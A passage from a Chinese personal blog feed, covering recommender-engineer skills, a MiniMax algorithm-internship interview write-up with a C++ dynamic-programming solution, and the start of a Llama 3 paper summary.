项技能的最小要求，因为在成为一名“优秀”的推荐工程师之前，首先应该是一名合格的工程师。不仅应具有领域相关的知识，还应具有把知识转换成实际系统的能力。推荐系统相关的从业者应该具有的最小能力要求如下：</p><ul><li><strong>知识：</strong>具备基本的推荐系统领域相关知识</li><li><strong>工具：</strong>具备编程能力，了解推荐系统相关的工程实践能力</li><li><strong>逻辑：</strong>具备算法基础，思考的逻辑性、条理性较强</li><li><strong>业务：</strong>对推荐系统的业务场景有所了解</li></ul><p>在最小要求的基础上，不同岗位对能力的要求也有所不同。结合上面的技能雷达，不同岗位的能力特点如下：</p><ul><li><strong>算法工程师</strong>：算法工程师的能力要求是相对全面的。作为算法模型的实现者和应用者，要求算法工程师有扎实的机器学习基础，改进和实现算法的能力，对工具的运用能力及对业务的洞察。</li><li><strong>大数据工程师</strong>：更注重大数据工具和平台的改进，需要维护推荐系统相关的整个数据链路，因此对运用<strong>工具</strong>的能力要求最高。</li><li><strong>算法研究员</strong>：担负着提出新算法、新模型结构等研究任务，因此对算法研究员的<strong>知识</strong>和<strong>逻辑</strong>能力的要求最高。</li><li><strong>能力“偏科”的工程师</strong>：有些人平时不注重对工具时殷弘、业务理解方面的知识积累，找工作时临时抱佛脚恶补知识、刷算法题，在一些面试场合下也许是奏效的，但要想称为一名优秀的推荐工程师，还需要补齐自己的能力短板。</li></ul><p>当然，只用“知识”“工具”“逻辑”“业务”这 4 个词描述推荐工程师所需的能力过于形而上，接下来具体解释这 4 个技能。</p><ul><li><strong>知识</strong>：主要指推荐系统相关知识和理论的储备，比如主流的推荐模型、Embedding 的主要方法等。</li><li><strong>工具</strong>：运用工具将推荐系统的知识应用于实际业务的能力，推荐系统相关的工具主要包括 TensorFlow、PyTorch 等模型训练工具，Spark、Flink 等大数据处理工具，以及一些模型服务相关的工具。</li><li><strong>逻辑</strong>：举一反三的能力，解决问题的条理性，发散思维的能力，聪明程度，通用算法的掌握程度。</li><li><strong>业务</strong>：理解推荐系统的应用场景、商业模式；从业务中发现用户动机，制定相应的优化目标并改进模型算法的能力。</li></ul><hr><h1 id="2-能力的深度和广度"><a href="#2-能力的深度和广度" class="headerlink" title="2 能力的深度和广度"></a>2 能力的深度和广度</h1><p>在一项具体的工作面前，优秀的推荐工程师所具备的能力应该是综合的——能够从“深度”和“广度”两个方面提供解决方案。例如，公司希望改进目前的推荐模型，于是你提出了以 DIN 为主要结构的模型改进方案。这就要求你在深度和广度两个方面对 DIN 的原理和实现方案有全面的了解。</p><p>深度方面，需要了解从模型动机到实现细节的一系列问题，一条从概括到具体的学习路径的例子如下：</p><ul><li>DIN 模型提出的动机是什么？是否适合自己公司当前的场景和数据特点。（业务理解能力）</li><li>DIN 模型的模型结构是什么？具体实现起来有哪些工程上的难点。（知识学习能力，工具运用能力）</li><li>DIN 模型强调的注意力机制是什么？为什么在推荐系统中使用注意力机制能够有效果上的提升？（业务理解能力，知识学习能力）</li><li>DIN 模型将用户和商品进行了 Embedding，在实际使用中，应该如何实现 Embedding 过程？（知识学习能力，逻辑思维能力）</li><li>是通过改进现有模型实现 DIN 模型，还是使用全新的离线训练方式训练 DIN 模型？（工具运用能力，逻辑思维能力）</li><li>线上部署和服务 DIN 模型有哪些潜在问题，有哪些解决方案？（工具运用能力）</li></ul><p>从这个例子中读者可以看到，一套完备的模型改进方案的形成需要推荐工程师深入了解新模型的细节。缺少了深度的钻研，改进方案就会在实现过程中遇到方向性的错误，增加纠错成本。</p><p>推荐工程师除了要深入了解所采用技术方案的细节，还需要在广度上了解各种可能的备选方案的优劣，做到通过综合权衡得出当前客观环境下的最优解。接着上文模型改进的例子，推荐工程师应该从以下方面在广度上进行知识储备：</p><ul><li>与 DIN 类似的模型有哪些，是否适合当前的使用场景？</li><li>DIN 模型使用的 Embedding 方法有哪些，不同 Embedding 方法的优劣是什么？</li><li>训练和上线 DIN 的技术方案有哪些？如何与自己公司的技术栈融合？</li></ul><p>在深度了解了一个技术方案的前提下，对其他方向的了解可以是概要式的，但也要清楚每种技术方案的要点和特点，必要时可通过 A&#x2F;B 测试、业界交流咨询、原型系统试验等方式排除候选方案，确定目标方案。</p><p>除此之外，工程和理论之间的权衡能力也是推荐工程师不可或缺的技能点之一。只有具备了这一点，才能在现实和理想之间进行合理的妥协，完成成熟的技术方案。</p><hr><h1 id="3-推荐工程师的能力总结"><a href="#3-推荐工程师的能力总结" class="headerlink" title="3 推荐工程师的能力总结"></a>3 推荐工程师的能力总结</h1><p>想要成为一名优秀的推荐工程师，甚至一名优秀的算法工程师，应该在“知识”“工具”“逻辑”“业务”这 4 个方面综合提高自己的能力，对某一技术方案应该有“深度”和“广度”上的技术储备，在客观技术环境的制约下，针对问题做出权衡和取舍，最终得出可行且合理的技术方案。</p><p>弘树，加油！</p>]]></content>
      
      
      <categories>
          
          <category> 推荐系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 推荐系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试记录3：MiniMax技术一面</title>
      <link href="/2024/12/04/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%953%EF%BC%9AMiniMax%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/"/>
      <url>/2024/12/04/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%953%EF%BC%9AMiniMax%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="1-面试背景"><a href="#1-面试背景" class="headerlink" title="1 面试背景"></a>1 面试背景</h1><ul><li>面试公司：MiniMax 大模型公司</li><li>面试岗位：大模型推荐&amp;广告算法实习生</li><li>面试类型：技术一面</li><li>面试时间：2024-12-04 17:00~18:00</li><li>面试结果：通过 😊</li></ul><hr><h1 id="2-整体感受"><a href="#2-整体感受" class="headerlink" title="2 整体感受"></a>2 整体感受</h1><p>面试之前一点也不紧张，因为自己保研参加很多线下的面试，而且之前也参加过华为的面试等，所以心态不慌。</p><p>面试官刚进来的时候，一看就知道是个强者，前面的头发快没了，而且一副中年程序员的样貌。在面试的过程中还是挺放松的，也一直和面试官讨论技术问题。最后，面试管问我还有什么问题么？我就问了很多我自己关于推荐系统的思考，感觉很 nice，面试官也和我讨论了很多。</p><p>需要改进的地方：</p><ol><li>自我介绍再背的熟一些</li><li>准备的再充分一些</li></ol><p>感觉自己发挥的挺好的，没有什么硬伤，还有一些小细节需要优化吧。</p><hr><h1 id="3-提问的问题"><a href="#3-提问的问题" class="headerlink" title="3 提问的问题"></a>3 提问的问题</h1><blockquote><p>面试官：你先介绍一下自己吧。</p></blockquote><p>balabala………</p><h2 id="3-1-Word2Vec"><a href="#3-1-Word2Vec" class="headerlink" title="3.1 Word2Vec"></a>3.1 Word2Vec</h2><blockquote><p>面试官：看到你参加了天池新闻推荐系统比赛，你可以说一下你是怎么用 Embedding 进行召回的吗？</p></blockquote><p>我主要使用 2 种方法来进行 Embedding，分别是 Word2Vec 和 训练 YouTube DNN 得到 Embedding。</p><p>首先介绍一下 Word2Vec，Word2Vec 是一个生成对“词”的向量表达的模型。分为词袋模型和跳元模型。</p><p>利用的物品序列是由特定用户的浏览、购买等行为产生的历史行为记录序列来生成 Embedding。输入向量表达就是输入层到隐层的权重矩阵 $\mathcal{W}_{V \times N}$，而输出向量表达就是隐层到输出层的权重矩阵 $\mathcal{W}^{’}_{N \times V}$。</p><p><img src="/2024/12/04/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%953%EF%BC%9AMiniMax%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_WcD7o_UN5s.png"></p><p>在获得输入向量矩阵 $\mathcal{W}_{V \times N}$ 后，其中每一行对应的权重向量就是通常意义上的“词向量”。于是这个权重矩阵自然转换成了 Word2Vec 的查找表（lookup table）。</p><p><img src="/2024/12/04/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%953%EF%BC%9AMiniMax%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/clipImg_RQ3MdahKEb.png"></p><p>假设语料库中的词的数量为 10000，就意味着输出层神经元有 10000 个，在每次迭代更新隐层到输出层神经元的权重时，都需要计算所有字典中的所有 10000 个词的预测误差（prediction error），在实际训练过程中几乎无法承受这样巨大的计算量。</p><p>为了减轻 Word2Vec 的训练负担，往往采用负采样（Negative Sampling）的方法进行训练。相比原来需要计算所有字典中所有词的预测误差，负采样方法只需要对采样出的几个负样本计算预测误差。</p><p>在此情况下， Word2Vec 模型的优化目标从一个多分类问题退化成了一个近似二分类问题，如下式所示：</p><p>$$<br>E&#x3D;-\log \sigma\left(\boldsymbol{v}_{w_{o}}^{\prime}{ }^{\mathrm{T}} \boldsymbol{h}\right)-\sum_{w_{j} \in W_{\text {neg }}} \log \sigma\left(-\boldsymbol{v}_{w_{j}}^{\prime}{ }^{\mathrm{T}} \boldsymbol{h}\right)<br>$$</p><p>其中 $\boldsymbol{v}_{w_{o}}^{\prime}$ 是输出词向量（即正样本），$\boldsymbol{h}$ 是隐层向量，$W_{neg}$ 是负样本集合，$\boldsymbol{v}_{w_{j}}^{\prime}$ 是负样本词向量。一般来说负样本集合的规模 $k$ 在小数据集中取 2~5，在大数据集中取 5~20，所以计算量会大大降低。</p><p>实际上，加快 Word2Vec 训练速度的方法还有分层 softmax，但实现较为复杂，且最终效果没有明显优于负采样方法，因此较少采用。</p><h2 id="3-2-YouTube-DNN"><a href="#3-2-YouTube-DNN" class="headerlink" title="3.2 YouTube DNN"></a>3.2 YouTube DNN</h2><p><img src="/2024/12/04/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%953%EF%BC%9AMiniMax%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_Ow5FnRNV0O.png"></p><p>由于 YouTube DNN 最后的输出层是 softmax，该 softmax 层的参数本质上是一个 $m \times n$ 维的矩阵，其中 $m$ 指的是最后一层（ReLU 层）的维度，$n$ 指的是分类的总数，也就是 YouTube 所有视频的总数为 $n$。那么视频 Embedding 就是这个 $m \times n$ 维矩阵的各列向量。这样的 Embedding 生成方法其实和 Word2Vec 中词向量的生成方法相同。</p><p>用户向量的生成就很好理解，因为输入的特征全部都是用户相关的特征，所以在使用某用户 $u$ 的特征向量作为模型输入时，最后一层 ReLU 层的输出向量可以当作该用户的 Embedding 向量。在模型训练完成后，逐个输入所有用户的特征向量到模型中，就可以得到所有用户的 Embedding 向量。</p><blockquote><p>面试官：那你得到 Embedding 之后是怎么进行召回的？</p></blockquote><p>在预测某用户的物品候选集时，先得到该用户的 Embedding 向量，再在物品 Embedding 空间中利用局部敏感哈希等方法搜索该用户 Embedding 向量的 TopK 近邻，就可以快速得到 $k$ 个候选视频集合。</p><p>我针对新闻具有强时效性的特点，只是用了用户点击的最近 3 个新闻的 Embedding 作平均来进行召回。</p><blockquote><p>面试官：你对用户最近点击的 3 个新闻的 Embedding 取平均，然后再进行召回，取平均之后是不是会丢失掉一些信息？</p></blockquote><p>确实会丢失掉一些信息，因为如果用户最后点击的几个新闻都是不同类型的，mean 之后的 Embedding 所表达的信息就失真了，这一点确实应当注意。</p><h2 id="3-3-LGB-模型"><a href="#3-3-LGB-模型" class="headerlink" title="3.3 LGB 模型"></a>3.3 LGB 模型</h2><blockquote><p>面试官：你选用的是 LGB 模型和 DIN 模型，LGB模型是基于树的，你能说一下这两个模型有什么区别吗？</p></blockquote><p>LightGBM（Light Gradient Boosting Machine）是一款基于决策树算法的分布式梯度提升框架。为了满足工业界缩短模型计算时间的需求，LightGBM 的设计思路主要是两点：</p><ol><li>减小数据对内存的使用，保证单个机器在不牺牲速度的情况下，尽可能地用上更多的数据</li><li>减小通信的代价，提升多机并行时的效率，实现在计算上的线性加速</li></ol><p>由此可见，LightGBM 的设计初衷就是提供一个快速高效、低内存占用、高准确度、支持并行和大规模数据处理的数据科学工具。</p><p><strong>LightGBM 和 XGBoost 的区别：</strong></p><p>（1）树生长策略：XGB 采用 Level-wise 的分裂策略，LGB 采用 Leaf-wise 的分裂策略。</p><ol><li>XGB 对每一层所有节点做无差别分裂，但是可能有些节点增益非常小，对结果影响不大，带来不必要的开销。</li><li>Leaf-wise 是在所有叶子节点中选取分裂收益最大的节点进行的，但是很容易出现过拟合问题，所以需要对最大深度做限制 。</li></ol><p>（2）分割点查找算法：XGB 使用特征预排序算法，LGB 使用基于直方图的切分点算法，其优势如下：</p><ol><li>减少内存占用，比如离散为 256 个 bin 时，只需要用 8 位整形就可以保存一个样本被映射为哪个 bin（这个 bin 可以说就是转换后的特征），对比预排序的 exact greedy 算法来说（用 int32 来存储索引 + 用 float32 保存特征值），可以节省 7&#x2F;8 的空间。</li><li>计算效率提高，预排序的 exact greedy 对每个特征都需要遍历一遍数据，并计算增益，复杂度为 $O(\text{feature} \times \text{data})$。而直方图算法在建立完直方图后，只需要对每个特征遍历直方图即可，复杂度为 $O(\text{feature} \times \text{bins})$。</li><li>LGB 还可以使用直方图做差加速，一个节点的直方图可以通过父节点的直方图减去兄弟节点的直方图得到，从而加速计算。</li></ol><p>（3）支持离散变量：无法直接输入类别型变量，因此需要事先对类别型变量进行编码（例如独热编码），而 LightGBM 可以直接处理类别型变量。</p><p>（4）缓存命中率：XGB 使用 Block 结构的一个缺点是取梯度的时候，是通过索引来获取的，而这些梯度的获取顺序是按照特征的大小顺序的，这将导致非连续的内存访问，可能使得 CPU Cache 缓存命中率低，从而影响算法效率。而 LGB 是基于直方图分裂特征的，梯度信息都存储在一个个 bin 中，所以访问梯度是连续的，缓存命中率高。</p><p>（5）LightGBM 与 XGboost 的并行策略不同：</p><ul><li><p><strong>特征并行</strong>：LGB 特征并行的前提是每个 worker 留有一份完整的数据集，但是每个 worker 仅在特征子集上进行最佳切分点的寻找；worker 之间需要相互通信，通过比对损失来确定最佳切分点；然后将这个最佳切分点的位置进行全局广播，每个 worker 进行切分即可。XGB 的特征并行与 LGB 的最大不同在于 XGB 每个worker 节点中仅有部分的列数据，也就是垂直切分，每个 worker 寻找局部最佳切分点，worker 之间相互通信，然后在具有最佳切分点的 worker上进行节点分裂，再由这个节点广播一下被切分到左右节点的样本索引号，其他 worker 才能开始分裂。二者的区别就导致了 LGB 中 worker 间通信成本明显降低，只需通信一个特征分裂点即可，而 XGB 中要广播样本索引。</p></li><li><p><strong>数据并行</strong>：传统的数据并行策略主要为水平划分数据，让不同的机器先在本地构造直方图，然后进行全局的合并，最后在合并的直方图上面寻找最优分割点。</p><p>  这种数据划分有一个很大的缺点：通讯开销过大。LightGBM 在数据并行中使用分散规约（Reduce scatter）把直方图合并的任务分摊到不同的机器，降低通信和计算; 在节点分裂时利用直方图做差，进一步减少了一半的通信量。参考 LightGBM 的并行优化。</p></li><li><p><strong>投票并行</strong>（LGB）：基于投票的数据并行则进一步优化数据并行中的通信代价，使通信代价变成常数级别。在数据量很大的时候，使用投票并行的方式只合并部分特征的直方图从而达到降低通信量的目的，可以得到非常好的加速效果。具体过程如下图所示。大致步骤为两步：</p><ol><li>本地找出 TopK 特征，并基于投票筛选出可能是最优分割点的特征；</li><li>合并时只合并每个机器选出来的特征。</li></ol></li></ul><h2 id="3-4-DIN-模型"><a href="#3-4-DIN-模型" class="headerlink" title="3.4 DIN 模型"></a>3.4 DIN 模型</h2><p><img src="/2024/12/04/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%953%EF%BC%9AMiniMax%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_rX2UFr2bgc.png"></p><p>DIN 网络结构整体上来看是在 embedding 层与 MLP（全连接层）之间加入了 activation unit。从上图能够看出，用户历史点击过的商品 id（good id）只与候选广告的商品 id 算相关性（上图中是 element-wise 减，当然你也可以算内积等，甚至可以都算），用户历史点击过的商铺 id 只与候选广告的商铺 id 算相关性。</p><p>以下模块是整个DIN网络的核心模块，也是该模型的创新之处，如下图所示。</p><p><img src="/2024/12/04/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%953%EF%BC%9AMiniMax%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_FBXT02paNt.png"></p><p>最后，论文中给出了一张示意图比较清晰的展示了用户历史行为 item 与广告 item 之间的 attention 得分，DIN 这种基于 attention score 的设计比较 soft 的得到了用户历史行为中每个 item 对于目标广告 item 的贡献度。</p><p><img src="/2024/12/04/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%953%EF%BC%9AMiniMax%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_QHvaSXeR_Z.png"></p><blockquote><p>面试官：单看这两个模型输出的结果，哪个更好呢？</p></blockquote><p>DIN 模型的效果更好一些，因为 DIN 模型引入了注意力机制，能够对用户兴趣进行更好的捕捉。</p><h2 id="3-5-bagging"><a href="#3-5-bagging" class="headerlink" title="3.5 bagging"></a>3.5 bagging</h2><blockquote><p>面试官：模型的输出是什么？你用的什么集成学习方法进行融合的？</p></blockquote><p>我把推荐问题当作一个分类问题，然后每个模型的输出都是一个概率，代表选择每个候选物品的可能性。之后使用的 bagging 集成学习方法进行融合。</p><p>为了建立一个集成学习方法，我们首先要选择待聚合的基础模型。在大多数情况下（包括在众所周知的 bagging 和 boosting 方法中），我们会使用单一的基础学习算法，这样一来我们就有了以不同方式训练的同质弱学习器。</p><p>这样得到的集成模型被称为「同质的」。然而，也有一些方法使用不同种类的基础学习算法：将一些异质的弱学习器组合成「异质集成模型」。</p><p>很重要的一点是：我们对弱学习器的选择应该和我们聚合这些模型的方式相一致。如果我们选择具有低偏置高方差的基础模型，我们应该使用一种倾向于减小方差的聚合方法；而如果我们选择具有低方差高偏置的基础模型，我们应该使用一种倾向于减小偏置的聚合方法。</p><p>Bagging 的思路是所有基础模型都一致对待，每个基础模型手里都只有一票。然后使用民主投票的方式得到最终的结果。</p><p>大部分情况下，<strong>经过 bagging 得到的结果方差（variance）更小</strong>。</p><p><img src="/2024/12/04/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%953%EF%BC%9AMiniMax%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_1ukcxUjxsq.png"></p><p><strong>具体过程：</strong></p><ol><li>从原始样本集中抽取训练集。每轮从原始样本集中使用 Bootstraping 的方法抽取 n 个训练样本（在训练集中，有些样本可能被多次抽取到，而有些样本可能一次都没有被抽中）。共进行 k 轮抽取，得到 k 个训练集。（k 个训练集之间是相互独立的）</li><li>每次使用一个训练集得到一个模型，k 个训练集共得到 k 个模型。（注：这里并没有具体的分类算法或回归方法，我们可以根据具体问题采用不同的分类或回归方法，如决策树、感知器等）</li><li>对分类问题：将上步得到的 k 个模型采用投票的方式得到分类结果；对回归问题，计算上述模型的均值作为最后的结果。（所有模型的重要性相同）</li></ol><blockquote><p>面试官：你了解一些大模型的基础知识吗？或者说，你能说一下为什么大模型能 work 吗？</p></blockquote><p>这个感觉答的很好哈哈哈，因为之前面过一个大模型实习岗位，有些经验。balabala……</p><hr><h1 id="4-手撕代码"><a href="#4-手撕代码" class="headerlink" title="4 手撕代码"></a>4 手撕代码</h1><p>给你一个正整数 $n$，可以将其分解为多个正整数的和（可以分解为自身），如下：</p><p>$$<br>n &#x3D; x_1 + x_2 + \cdots + x_k<br>$$</p><ol><li>请找出分解出的多个 $x_i$ 连乘的最大结果是多少，即求解 $\max \prod_i^k{x_i}$ 。</li><li>如果可以将正整数 $n$ 分解为多个正数的和，即 $x_i$ 可以是小数，求解 $\max \prod_i^k{x_i}$。</li></ol><p>后来发现力扣上有一道很像的题目：<a href="https://leetcode.cn/problems/integer-break/description/" title="343. 整数拆分">343. 整数拆分</a>。但是第一问有点不一样，力扣中的题目要求至少分解为两个整数，但是面试的题目可以分解为自身。</p><h2 id="4-1-问题一"><a href="#4-1-问题一" class="headerlink" title="4.1 问题一"></a>4.1 问题一</h2><p>当时看到这道题的时候懵了一下，因为之前没见过这种题。然后当时先说了可以暴力枚举每一个 $i$，之后面试官说你可以想一下有没有其他的方法。之后，我就在想可以用到什么方法，之后就突然想到其实可以使用动态规划。</p><p>当时表现的挺好的，直接就说了应该可以使用动态规划，然后我把我为什么想用动态规划解决的思路给面试官讲了：</p><p>当我们分解 $n$ 时，可以枚举分解结果中会出现的每一个正整数 $i$ ，然后剩下就需要找出和为 $n - i$ 的分解问题，可以发现一个大问题分解成了一个小问题，相当于找到了一个子问题。</p><p>之后面试官说让我写一下代码，其实当时还不知道怎么写哈哈哈，就是有个思路，然后就开始写了……</p><ol><li>状态表示：$f[i]$ 表示和为 $i$ 的分解出的 $x$ 的最大连乘结果</li><li>状态计算：$f[i] &#x3D; \max(f[i], j \times f[i - j])$</li></ol><p>由于第 $i$ 个状态需要从第 $i - j$ 个状态转移过来，所以肯定从小到大遍历，题解如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n; cin &gt;&gt; n;</span><br><span class="line">    </span><br><span class="line">    f[<span class="number">0</span>] = <span class="number">1</span>, f[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j ++)</span><br><span class="line">            f[i] = <span class="built_in">max</span>(f[i], j * f[i - j]);</span><br><span class="line">    </span><br><span class="line">    cout &lt;&lt; f[n];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当时第一遍其实写错了，具体在于第二层循环 $j$ 的范围写成了 $[1, i - 1]$，没有包含边界 $i$，这样是不对的，因为假设分解 $8$，如果 $j $ 最大为 $7$，那么就没有考虑分解为自身，所以出错。</p><p>感觉当时面试官看到我这么做好像是第一次见，因为我当时第一遍写完了，面试官说他需要看一下，让我先看第二道题。之后他好像没太懂我的意思，就让我给他解释一下为什么这么做。</p><p>然后运行了之后答案不对，面试官让我找一下问题出在哪里。其实我当时有点慌的，怕做不出来，然后挂了。但是当时感觉也没有什么压力，就认真的去想，然后马上就找到了问题，重新测试结果正确。</p><p>然后面试官又和我讨论了一个 trick，他说 $f[0]&#x3D;1$ 是我使用的技巧，最好初始化如下：</p><p>$$<br>f[i] &#x3D; 1, i \in [1, n]<br>$$</p><p>只能说太细了。</p><h2 id="4-2-问题二"><a href="#4-2-问题二" class="headerlink" title="4.2 问题二"></a>4.2 问题二</h2><p>第二题就有点迷，因为可以分解成很多小数。当时就一直想是不是平均分配乘积最大？然后就说了这个想法，面试官说是的，问我那应该均分成多少份？</p><p>然后我当时就假设均分为 $k$ 份，写了以下表达式：</p><p>$$<br>\max(\frac{n}{k})^k , k \in [1, n]<br>$$</p><p>当时就想这怎么写程序求解，然后就说可以枚举每一个 $k$，之后突然意识到这不就是函数求极值的问题么，应该可以求导，找导数为 $0$ 的 $k$，面试官认可了这个思路，然后基本就结束了。</p><hr><h1 id="5-总结"><a href="#5-总结" class="headerlink" title="5 总结"></a>5 总结</h1><ol><li>在面试的过程中抱着思考交流的心态，和面试官一起讨论技术，感觉这样很舒服。因为很少有机会能和工业界的技术人员进行交流。</li><li>就算面试的过程中遇到一些不会的问题，可以大胆给出自己的思考，感觉面试中不止看重结果，你的思维逻辑也很重要。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 找工作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文精读6：Llama3</title>
      <link href="/2024/12/03/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB6%EF%BC%9ALlama3/"/>
      <url>/2024/12/03/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB6%EF%BC%9ALlama3/</url>
      
        <content type="html"><![CDATA[<h1 id="Llama3"><a href="#Llama3" class="headerlink" title="Llama3"></a>Llama3</h1><blockquote><p>现代人工智能（AI）系统是由基础模型提供动力的。本文提出了一套新的基础模型，称为Llama 3。它是一群原生支持多语言、代码、推理和工具使用的语言模型。我们最大的模型是一个稠密的Transformer，具有<code>405B</code>参数和高达<code>128K</code> tokens的上下文窗口。本文对Llama 3进行了广泛的实证评价。我们发现，Llama 3在大量任务上提供了与<code>GPT-4</code>等领先语言模型相当的水平。我们公开发布了Llama 3，包括预训练和后训练的<code>405B</code>参数语言模型的版本，以及我们的Llama Guard 3模型的输入和输出安全。本文还介绍了我们通过合成方法将图像、视频和语音能力整合到Llama 3中的实验结果。我们观察到，这种方法在图像、视频和语音识别任务上与最先进的方法相竞争。生成的模型还没有被广泛发布，因为它们还在开发中。</p></blockquote><h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1 Introduction"></a>1 Introduction</h1><p>基础模型是语言、视觉、语音或其他模式的通用模型，它们被设计用来支持大量的人工智能任务。它们构成了许多现代人工智能系统的基础。</p><p>现代基础模型的发展包括两个主要阶段：</p><ol><li><strong>预训练阶段：</strong>模型在大规模训练使用直接任务如单词预测或字幕</li><li><strong>后训练阶段：</strong>模型调整遵循指令，符合人类的偏好，提高特定的能力（例如编码和推理）</li></ol><p>在本文中，我们提出了一套新的语言基础模型，称为Llama 3。Llama 3系列模型原生支持多语言、编码、推理和工具使用。我们最大的模型是具有<code>405B</code>参数的密集Transformer，在高达<code>128K</code>令牌的上下文窗口中处理信息。表1列出了模型群中的每个成员。本文中给出的所有结果都是针对Llama 3.1模型的，为了简洁起见，我们将其称为Llama 3。</p><blockquote><p>表1：模型<code>Llama3</code>模型群概述。本文中的所有结果都是针对 Llama 3.1模型。</p></blockquote><p><img src="/2024/12/03/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB6%EF%BC%9ALlama3/image_IEQpvhLCPi.png"></p><p>我们相信在开发高质量的基础模型中有三个关键因素：<strong>数据、规模和管理复杂性</strong>。我们试图在开发过程中优化这三个问题：</p><ul><li><strong>数据</strong>：与之前版本的Llama（Touvron et al.，2023a, b）相比，我们改进了用于预训练和后训练的数据的数量和质量。这些改进包括为训练前数据开发更仔细的预处理和管理管道，以及为训练后数据开发更严格的质量保证和过滤方法。我们在一个大约<code>15T</code>个多语言标记的语料库上对Llama 3进行了预训练，而Llama 2的标记为<code>1.8T</code>。</li><li><strong>规模</strong>：我们训练了一个比以前的Llama模型更大的模型：我们的旗舰版语言模型使用$3.8×10^{25}$ FLOPs进行预训练，比最大的版本多了近$50×$。具体来说，我们在<code>15.6T</code>文本标记上预先训练了一个具有40个<code>5B</code>可训练参数的旗舰模型。正如预期的那样基础模型的scaling low，我们的旗舰模型优于使用相同程序训练的较小模型。虽然我们的scaling low表明我们的旗舰模型对于我们的训练预算来说是一个近似计算最优的大小，但我们也训练我们的较小模型比计算最优模型长得多。在相同的推理预算下，得到的模型的性能优于计算最优模型。我们使用旗舰模型来进一步提高训练后这些较小模型的质量。</li><li><strong>管理复杂性</strong>：我们做出设计选择，试图最大化我们扩展模型开发过程的能力。例如，我们选择了一个标准的稠密 Transformer 模型架构（2017），并进行了轻微的调整，而不是专家混合模型（2017）以最大化训练稳定性。同样，我们采用了相对简单的基于监督微调 (SFT)、拒绝采样 (RS) 和直接偏好优化（DPO）的后训练过程，而不是更复杂的强化学习算法（Ouyang et al., 2022; Schulman et al., 2017），它们往往不太稳定，更难扩展。</li></ul><p>我们工作的结果是 Llama 3：三个具有 <code>8B</code>、<code>70B</code>和 <code>405B</code>参数的多语言模型的 herd。我们在跨越广泛语言理解任务的众多基准数据集上评估 Llama 3 的性能。此外，我们执行广泛的人工评估，将 Llama 3 与竞争模型进行比较。</p><p><img src="/2024/12/03/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB6%EF%BC%9ALlama3/image_oLPQA8IXeC.png"></p><blockquote><p>表2：微调 Llama 3 模型在关键基准评估上的性能。该表比较了 Llama 3 的 <code>8B</code>、<code>70B</code>和 <code>405B</code>版本与竞争模型的性能。我们将三个模型大小等价类中的每一个中表现最好的模型加粗。$△$表示使用 5-shot 提示（无 <code>CoT</code>）获得的结果。◁表示没有 <code>CoT</code>获得的结果。$♢$表示使用零样本提示获得的$ 9.9%$结果。</p></blockquote><p>表2给出了旗舰Llama 3模型在关键基准上的性能概述。我们的实验评估表明，我们的旗舰模型在各种任务上的表现与GPT-4（OpenAI, 2023a）等领先语言模型相当，并且接近于与最先进的匹配。我们的较小模型是最好的，优于具有相似参数数量的替代模型（Bai et al., 2023; Jiang et al., 2023）。Llama 3 也比其前身在有用性和无害性之间提供了更好的平衡（Touvron 等人、2023b）。我们在第 5.4 节中详细分析了 Llama 3 的安全性。</p><p>我们在 Llama 3 社区许可证的更新版本下公开发布所有三个 Llama 3 模型；参见 <a href="https://llama.meta.com/" title="https://llama.meta.com">https://llama.meta.com</a>。这包括我们的 405B 参数语言模型的预训练和训练后版本以及我们的 Llama Guard 模型的新版本 (Inan et al., 2023) 用于输入和输出安全。我们希望旗舰模型的公开发布将推动研究界的创新浪潮，并加速迈向人工智能 (<code>AGI</code>) 发展的途径。</p><p>作为 Llama 3 